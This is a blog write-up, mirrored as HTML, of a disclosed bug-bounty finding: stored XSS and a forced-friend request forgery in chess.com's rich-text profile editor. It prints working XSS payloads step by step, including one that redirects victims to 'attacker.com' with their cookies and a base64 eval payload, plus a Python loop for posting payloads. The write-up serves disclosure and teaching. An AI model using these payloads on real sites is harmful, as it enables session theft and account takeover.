<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://skii.dev/rook-to-xss/">Original</a>
    <h1>Rook to XSS: How I hacked chess.com with a rookie exploit</h1>
    
    <div id="readability-page-1" class="page"><section>
				<p>Playing Chess is one of the many hobbies I like to do in my spare time, apart from tinkering around with technology. However, I&#39;m not very good at it, and after losing many games, I decided to see if I could do something I&#39;m much better at; hacking the system!</p><p>This blog post is about how I used my cybersecurity knowledge to find XSS on the #1 chess site on the internet, with a user base of over <strong>100 million</strong> members - <a href="https://chess.com/?ref=skii.dev" rel="noreferrer">Chess.com</a>. But first, a bit of preface (that includes a slightly less serious, although amusing, OSRF vulnerability!)</p><hr/><p>In early 2023, I started playing a lot on chess.com; during a discussion with a friend on Discord, I persuaded them to also sign up to the site and used a feature offered by <code>chess.com</code> to become friends once they signed up immediately. </p><figure><img src="https://skii.dev/content/images/2024/01/Untitled.png" alt="" loading="lazy" width="460" height="174"/></figure><p>This feature reminded me of the <a href="https://www.vice.com/en/article/wnjwb4/the-myspace-worm-that-changed-the-internet-forever?ref=skii.dev" rel="noreferrer">MySpace worm</a> in ~2005 (heck, I wasn&#39;t even alive then!) when Samy Kamkar injected some code into his profile that would friend anyone who visited it and then inject the same code into their profile (hence creating the worm). I wondered if it would be possible to do something similar here. I clicked on the link and created a new account, then checked the dev tools network tab - interestingly, <strong>after</strong> the account had been made, it sent a GET request to <code>htttps://chesss.com/registration-invite?hash=XXX</code> </p><figure><img src="https://skii.dev/content/images/2024/01/image-1.png" alt="" loading="lazy" width="543" height="653"/></figure><p>This meant that if I could get a user to request this URL, it would force them to friend me automatically. Coincidentally, I was also messing with my settings when I came across the holy grail.....a TinyMCE rich text editor with an image upload function! </p><figure><img src="https://skii.dev/content/images/2024/01/image-3.png" alt="" loading="lazy" width="753" height="559" srcset="https://skii.dev/content/images/size/w600/2024/01/image-3.png 600w, https://skii.dev/content/images/2024/01/image-3.png 753w"/></figure><p>Let&#39;s see what happens when I insert a <a href="https://i.imgur.com/0PmEjVm.png?ref=skii.dev" rel="noreferrer">link</a> for the image. Is the URL embedded directly, or will there be some safe handling to protect against request forgeries? </p><figure><img src="https://skii.dev/content/images/2024/01/image-11.png" alt="" loading="lazy" width="1430" height="521" srcset="https://skii.dev/content/images/size/w600/2024/01/image-11.png 600w, https://skii.dev/content/images/size/w1000/2024/01/image-11.png 1000w, https://skii.dev/content/images/2024/01/image-11.png 1430w" sizes="(min-width: 1200px) 1200px"/></figure><p>Chess.com handles this server-side by re-uploading the image to their content hosting server and then pointing the image URL to that. Hmmm...<em>But</em> what about using a link whose root domain is <code>chess.com</code>? Would that still get re-uploaded? This would be important, especially when chained with a specific URL like...</p><figure><img src="https://skii.dev/content/images/2024/01/Untitled-1.png" alt="" loading="lazy" width="460" height="263"/></figure><figure><img src="https://skii.dev/content/images/2024/01/image-12.png" alt="" loading="lazy" width="753" height="100" srcset="https://skii.dev/content/images/size/w600/2024/01/image-12.png 600w, https://skii.dev/content/images/2024/01/image-12.png 753w"/></figure><p><strong>BINGO!</strong> I switched to my alt account, navigated to my main account&#39;s profile and then checked my alt&#39;s friend list - it had successfully added my main account. </p><figure><img src="https://skii.dev/content/images/2024/01/image-7.png" alt="" loading="lazy" width="771" height="313" srcset="https://skii.dev/content/images/size/w600/2024/01/image-7.png 600w, https://skii.dev/content/images/2024/01/image-7.png 771w" sizes="(min-width: 720px) 720px"/></figure><p>I genuinely couldn&#39;t believe this had worked, and I had quite a chuckle about it. During the bug-bounty report &amp; triage, the developers tried to implement a block because when I tried to reproduce it again for them, it came up with the following error message:</p><figure><img src="https://skii.dev/content/images/2024/01/Untitled-2.png" alt="" loading="lazy" width="246" height="116"/></figure><p>No problem at all, though; I managed to bypass it again by setting up a subdomain that included <code>chess.com</code> &amp; redirected it to <code>/registration-invite</code> </p><figure><img src="https://skii.dev/content/images/2024/01/image-8.png" alt="" loading="lazy" width="892" height="399" srcset="https://skii.dev/content/images/size/w600/2024/01/image-8.png 600w, https://skii.dev/content/images/2024/01/image-8.png 892w"/></figure><p>And here&#39;s what it looked like when visiting my profile:</p><figure><img src="https://skii.dev/content/images/2024/01/image-13.png" alt="" loading="lazy" width="1436" height="373" srcset="https://skii.dev/content/images/size/w600/2024/01/image-13.png 600w, https://skii.dev/content/images/size/w1000/2024/01/image-13.png 1000w, https://skii.dev/content/images/2024/01/image-13.png 1436w" sizes="(min-width: 1200px) 1200px"/></figure><p>After finding and reporting this bug, I was very interested in what else I could achieve by abusing TinyMCE - could I get XSS? How good was the sanitisation? That brings us to the exciting part of the blog post...</p><hr/><p>After playing around with the editor for a bit, I realised I wouldn&#39;t get very far without using something like <a href="https://portswigger.net/burp?ref=skii.dev" rel="noreferrer">Burp&#39;s proxy</a> to intercept the request to save my <code>About</code> description and inject raw HTML code directly (Anything written in the editor was treated as text). Of course, as one would expect, there were already preventions to remove any non-whitelisted attributes and tags - so let&#39;s look at what <em>is</em> allowed. </p><p>Viewing the TinyMCE config on the site (you can find this in the <code>tinymce-lazy-client.js</code> file), for <code>img</code> tags the <code>background-image</code> style attribute is in the <code>Allow</code> list and does not get filtered out. This was a long shot, but I wondered if the function to re-upload any external URL for the image also got applied to the attributes. Well...no harm in trying; let&#39;s see what happens using the following payload:</p><pre><code>&lt;p&gt;&lt;img src=&#34;https://www.pngmart.com/files/22/Penguin-PNG-Photos.png&#34; style=&#34;display: block; margin: 0 auto; background-image: url(https://test.com/);&#34;&gt; &lt;p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/Untitled-3.png" alt="" loading="lazy" width="1556" height="322" srcset="https://skii.dev/content/images/size/w600/2024/01/Untitled-3.png 600w, https://skii.dev/content/images/size/w1000/2024/01/Untitled-3.png 1000w, https://skii.dev/content/images/2024/01/Untitled-3.png 1556w" sizes="(min-width: 1200px) 1200px"/></figure><p> I actually couldn&#39;t believe my eyes when I loaded up my profile. It had indeed conveyed the URL, and somewhere along this process, something had gone terribly wrong, resulting in a <code>&#34;</code> being appended to the beginning of the new link. This resulted in the style attribute being closed prematurely, causing the URL to be converted into extra attributes! </p><p>Because adding unfiltered attributes was possible, I tried to figure out how I could generate a payload that the server would manipulate into running malicious javascript on image load. It seemed that in the URL, <code>/</code> was being used as a delimiter, with each element between it being added as a new attribute. So I tried with <code>url(&#39;https://test.com/onload&#39;) </code></p><figure><img src="https://skii.dev/content/images/2024/01/Untitled-4.png" alt="" loading="lazy" width="540" height="119"/></figure><p>To figure out how to add a payload, I tried fuzzing through all the symbols and seeing how each changed the final result. Through this tactic, I worked out you could add a <code>?</code> to modify the subsequent attribute data (although this comes with the slight caveat that you wouldn&#39;t be able to use the <code>?</code> symbol in the rest of the payload). Using the following:</p><pre><code>&lt;p&gt;&lt;img src=&#34;https://www.pngmart.com/files/22/Penguin-PNG-Photos.png&#34; style=&#34;display: block; margin: 0 auto; background-image: url(https://images.chesscomfiles.com/?/onload=alert);&#34;&gt; &lt;p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/Untitled-5.png" alt="" loading="lazy" width="640" height="99" srcset="https://skii.dev/content/images/size/w600/2024/01/Untitled-5.png 600w, https://skii.dev/content/images/2024/01/Untitled-5.png 640w"/></figure><p>Now we have another issue: the final <code>&amp;quot;&amp;quot;</code> at the end will throw a syntax error every time, preventing code from running...let&#39;s use <code>//</code> to comment that out and test a basic <code>alert(1)</code></p><pre><code>&lt;p&gt;&lt;img src=&#34;https://www.pngmart.com/files/22/Penguin-PNG-Photos.png&#34; style=&#34;display: block; margin: 0 auto; background-image: url(&#39;https://images.chesscomfiles.com/?/onload=alert(1);//&#39;);&#34;&gt; &lt;p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/Untitled-7.png" alt="" loading="lazy" width="441" height="112"/></figure><p>Damn, brackets are filtered….this means that I wouldn’t be able to call any functions with any parameters.</p><p>Even worse, practically every useful symbol is filtered – <code>,’ ^&amp;[]’$%</code> ...so how are we supposed to get any serious impact? Back to basics - Let’s see if we can set a variable, <code>x</code>, to <code>4</code>. (Luckily, the <code>=</code> symbol isn&#39;t filtered out.)</p><pre><code>&lt;p&gt;&lt;img src=&#34;https://www.pngmart.com/files/22/Penguin-PNG-Photos.png&#34; style=&#34;display: block; margin: 0 auto; background-image: url(https://images.chesscomfiles.com/?/onload=&#39;x=2;//&#39;);&#34; class=&#34;imageUploaderImg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/Untitled-8.png" alt="" loading="lazy" width="389" height="47"/></figure><p>Using an <code>‘</code> in our payload messes up the JS (encoded to <code>%27</code>) and throws a syntax error. I had to do a bit of thinking here, but after a while, I realised that <code>%27</code> could also be interpreted as the end part of a modulus operation...maybe I could get the browser to execute that operation and then carry out the variable assignment. Here&#39;s the payload I came up with:</p><pre><code>&lt;p&gt;&lt;img src=&#34;https://www.pngmart.com/files/22/Penguin-PNG-Photos.png&#34; style=&#34;display: block; margin: 0 auto; background-image: url(https://images.chesscomfiles.com/?/onload=4&#39;;x=2;//&#39;);&#34; class=&#34;imageUploaderImg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/Untitled-9.png" alt="" loading="lazy" width="364" height="42"/></figure><p><strong>RESULT!</strong> Now we&#39;re getting somewhere. Let&#39;s see if we can modify some inbuilt variables (like <code>document.cookie</code>) to a string instead. This might be a pain because all the usual ways of defining a new string utilise quotes or backticks that are unfortunately filtered out. </p><p>Time to do some googling. After a bit of rummaging around on StackOverflow, I came across this comment:</p><figure><img src="https://skii.dev/content/images/2024/01/Untitled-10.png" alt="" loading="lazy" width="570" height="35"/></figure><p>So it turns out you can define a regex and then get the string from the <code>source</code> attribute! Let&#39;s incorporate this into our payload and try to overwrite the <code>PHPSESSID</code> cookie. (Thank you, Frobinsonj!)</p><pre><code>&lt;p&gt;&lt;img src=&#34;https://www.pngmart.com/files/22/Penguin-PNG-Photos.png&#34; style=&#34;display: block; margin: 0 auto; background-image: url(https://images.chesscomfiles.com/?/onload=4&#39;;document.cookie=/PHPSESSID=invalid /.source;//&#39;);&#34; class=&#34;imageUploaderImg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/Untitled-11.png" alt="" loading="lazy" width="1021" height="101" srcset="https://skii.dev/content/images/size/w600/2024/01/Untitled-11.png 600w, https://skii.dev/content/images/size/w1000/2024/01/Untitled-11.png 1000w, https://skii.dev/content/images/2024/01/Untitled-11.png 1021w" sizes="(min-width: 720px) 720px"/></figure><p>Overwriting the cookies is cool, but we want to extract the currently set ones for a more significant impact. We can try to set the document and location variables to redirect the user to a site we own, adding on the cookies as parameters, but the problem is we can&#39;t use the <code>?</code> Symbol, as mentioned earlier.</p><p>Okay, so maybe not as a parameter - but there are other ways to include data in the URL - for example, by setting it in the path. Something like <code>http:attacker.com/sensitivedata</code> requires the use of a <code>/</code>, but unfortunately, we already use that to format the whole URL as a string via the regex trick.</p><p>However, who said we need to enter the <code>/</code> character manually? It&#39;s used all the time for directory paths, so there must already be a JavaScript variable with it included that we can tack onto! In this case, I quickly found <code>location.pathname</code></p><figure><img src="https://skii.dev/content/images/2024/01/image-14.png" alt="" loading="lazy" width="183" height="43"/></figure><p>Here&#39;s the final payload:</p><pre><code>&lt;p&gt;&lt;img src=&#34;https://www.pngmart.com/files/22/Penguin-PNG-Photos.png&#34; style=&#34;display: block; margin: 0 auto; background-image: url(https://images.chesscomfiles.com/?/onload=4&#39;;document.location=/http:attacker.com/.source+location.pathname+document.cookie;//&#39;);&#34; class=&#34;imageUploaderImg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/image-15.png" alt="" loading="lazy" width="1180" height="386" srcset="https://skii.dev/content/images/size/w600/2024/01/image-15.png 600w, https://skii.dev/content/images/size/w1000/2024/01/image-15.png 1000w, https://skii.dev/content/images/2024/01/image-15.png 1180w"/></figure><p>Nice. So I can extract cookies without <em>HttpOnly</em><strong> </strong>or any other stored JavaScript objects. I pulled some sensitive account data and reported it to the security team. </p><p>Having managed to get this far, I felt pretty proud, but I&#39;m always up for a challenge and enjoy pushing myself, so I wanted to try to get full XSS. I pondered for a couple of days about how I could achieve this. </p><p>Let&#39;s return to the original issue of using <code>url()</code> in the <code>background-image</code> style that immediately closes the attribute with the URL leftover to be added as unfiltered attributes. What if we move the <code>url()</code> part to another, more direct attribute like <code>srcset</code> instead of using it in style? It&#39;d be a long shot, but it might be treated slightly differently and thus let us use more symbols for a broader syntax of JS, leading to full XSS! Here&#39;s what I came up with:</p><pre><code>&lt;p&gt;&lt;img src=&#34;a.png&#34; style=&#34;display: block; margin: 0 auto;&#34; srcset=url(https://images.chesscomfiles.com/onerror=eval(atob(&#34;YWxlcnQoMSk=)));2+4//&gt;&lt;/p&gt;</code></pre><p>As you can see, this doesn&#39;t require a <code>?</code> to be used, and the <code>(</code>, <code>&#34;</code> symbols are not encoded, meaning we can base64 any payload and directly execute that! Whoo! </p><figure><img src="https://skii.dev/content/images/2024/01/image-16.png" alt="" loading="lazy" width="454" height="156"/></figure><p>To top it all off, I quickly learned that the TinyMCE rich text editor system was used not only in your profile&#39;s <code>About Me</code> page but practically everywhere on the site, including comments in forums and blogs! This had a significant impact because thousands of users used the comments and blogs daily. </p><p>I hope you enjoyed reading this as much as I did finding this intriguing bug! In the end, it turned out that the ability for XSS was already known (this is pretty common in bug bounties). Still, my initial vector through the background-image attribute was not known to them, and they thoroughly enjoyed reading my detailed report, offering me a bonus reward for it.</p><div data-kg-toggle-state="close">
            <div>
                <h4><span>Aside: How I accidentally triggered blind XSS</span></h4>
                </div>
            <div><p><span>During communication with the triage team at chess.com about the initial OSRF vulnerability, they asked me how I managed to execute XSS (an alert had popped up while viewing my profile) - I was confused because, at that time, I couldn&#39;t get any injection possible and had no idea where they got that from. Maybe it was another hacker who also got fed up with losing!</span></p><p><span>It turned out that when viewing my profile, the staff team could roll back previous versions to view - loading these previous versions did not filter out malicious HTML from my input. Thus, when I was trying for XSS, the malicious payload was saved as an earlier version and executed as soon as the staff member viewied it!</span></p></div>
        </div><hr/><p>The root issue behind these vulnerabilities is the re-uploading image function. Firstly, its checking system to see if the image was hosted on chess.com can easily be tricked by including chess.com in the domain name. Instead, it should check if the <strong>root </strong>domain is equal to <code>chess.com</code> or, even better, re-upload the image to its posting CDN no matter what the source is.</p><p>Rich text editors are a gold mine for achieving XSS because they allow different HTML elements for a more stylish appearance. Instead of accepting input and treating it only <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html?ref=skii.dev#safe-sinks" rel="noreferrer">as text</a>, it has to get raw HTML and directly embed it - this is why configuring allow-lists for what elements &amp; attributes can be taken is so important, as well as ensuring the RTE is always up-to-date. </p><p>However, in this case, TinyMCE was up-to-date and had been configured correctly not to allow scripting tags and attributes. The problem was that when we inputted the code for our profile, it firstly sanitised it (good), but it did this before it ran extra code on it, such as the re-uploading function - this led to the final HTML being completely different and not going through sanitisation to recheck it. </p><p>If <code>chess.com</code> wants to keep RTE, it should ensure that the sanitisation is run directly on the final HTML shown to the user. Even though the HTML modification was caused by the re-uploading function modifying the URL, and <em>technically </em>fixing that would stop this specific attack vector, another function may do something similar. Hence, it&#39;s essential to fix the sanitisation directly! (Defense in depth)</p><p>Finally, here are some extra details about the findings:</p><ol><li>If you&#39;re wondering why I didn&#39;t just use <code>friend.chess.com</code> directly for the OSRF exploit, during my testing of this, chess.com changed something to do with how it functioned, and I could only get <code>chess.com/registration-invite</code> to work...</li><li>Google did not like me setting up a <code>chess.com</code> subdomain, and a couple of weeks later, my domain got flagged for &#34;phishing.&#34; - I had to contact them to explain and manually remove it as it affected my whole domain. </li><li>During the data extraction stage, where I couldn&#39;t exfil the data as a parameter, I realised I could have instead set the data as a subdomain like <code>http:sensitivedata.attacker.com</code> . This is possible using a multi-level wildcard (catch-all) DNS system with something like a Cloudflare worker to log the subdomain requested. This, however, would be more complicated to set up, and I haven&#39;t dug too deep into it.</li><li>Alternatively, instead of using Burp to intercept and send the raw data in the <code>About</code> section rich text editor, you could also manually send the POST request using a scripting language like <code>Python</code></li></ol><pre><code>import requests, os
import urllib3

cookies = {
    xxxxx
}

headers = {
    xxxxxx
}

data = {
    &#39;profile[firstName]&#39;: &#39;Jake&#39;,
    &#39;profile[lastName]&#39;: &#39;&#39;,
    &#39;profile[location]&#39;: &#39;&#39;,
    &#39;profile[country]&#39;: &#39;164&#39;,
    &#39;profile[language]&#39;: &#39;10&#39;,
    &#39;profile[contentLanguage][contentLanguage]&#39;: &#39;default_and_user&#39;,
    &#39;profile[timezone]&#39;: &#39;Europe/London&#39;,
    &#39;profile[ratingType]&#39;: &#39;&#39;,
    &#39;profile[fideRating]&#39;: &#39;&#39;,
    &#39;profile[about]&#39;: &#39;&lt;p&gt;payload here&lt;/p&gt;&#39;,
    &#39;profile[save]&#39;: &#39;&#39;,
    &#39;profile[_token]&#39;: &#39;xxxx&#39;,
}


while True:
    data[&#39;profile[about]&#39;] = input() 

    response = requests.post(&#39;https://www.chess.com/settings&#39;, cookies=cookies, headers=headers, data=data)
    print(response)</code></pre><p><strong>Disclaimer</strong>: This process was done under CC&#39;s bug bounty program, strictly staying within the scope; PII information has been censored by request. This bug was reported over a year ago and has passed the 9-month disclosure time. Please only hack on sites that you have written permission to!</p>
			</section></div>
  </body>
</html>
